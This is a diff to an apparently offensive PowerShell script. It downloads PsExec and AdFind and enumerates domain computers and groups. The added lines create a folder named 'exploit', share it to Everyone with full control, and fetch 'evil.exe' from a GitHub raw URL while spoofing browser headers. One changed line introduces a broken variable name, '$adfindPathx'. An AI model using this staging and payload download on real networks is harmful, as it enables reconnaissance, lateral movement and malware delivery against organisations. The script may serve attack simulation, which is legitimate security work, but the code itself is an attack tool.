@@ -1,5 +1,9 @@
 "Downloading PsExec"
-$staticPath= $PWD.Path
+
+$staticPath= C:\users\$env:USERNAME\exploit
+mkdir $staticPath
+net share ShareName=$staticPath /grant:Everyone,FULL
+
 $pstoolsUrl = 'https://download.sysinternals.com/files/PSTools.zip'
 $outputPath = $staticPath+'\PSTools.zip'
 $pstoolsPath = $staticPath+'\PSTools'
@@ -32,8 +36,7 @@ Invoke-WebRequest -UseBasicParsing -Uri $adfindUrl `
 } `
 -ContentType "application/x-www-form-urlencoded" `
 -Body "download=AdFind.zip&email=&B1=Download+Now"  -OutFile $outputPath
-
-Expand-Archive -Path $outputPath -DestinationPath $adfindPath
+Expand-Archive -Path $outputPath -DestinationPath $adfindPathx  
 cd $adfindPath
 .\adfind -f "objectcategory=computer" > "./../computers.txt"
 cd ..
@@ -41,3 +44,22 @@ $user = whoami
 "Checking up the domain"
 net group /domain > group_domains.txt
 whoami /groups user_group.txt
+
+"downloading evil.exe"
+$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$session.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/evil.exe" `
+-WebSession $session `
+-Headers @{
+"Accept"="*/*"
+  "Accept-Encoding"="gzip, deflate, br"
+  "Accept-Language"="he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
+  "Origin"="https://github.com"
+  "Referer"="https://github.com/DolevAttiya/lol/blob/main/evil.exe"
+  "Sec-Fetch-Dest"="empty"
+  "Sec-Fetch-Mode"="cors"
+  "Sec-Fetch-Site"="cross-site"
+  "sec-ch-ua"="`"Not.A/Brand`";v=`"8`", `"Chromium`";v=`"114`", `"Google Chrome`";v=`"114`""
+  "sec-ch-ua-mobile"="?0"
+  "sec-ch-ua-platform"="`"macOS`""
+}
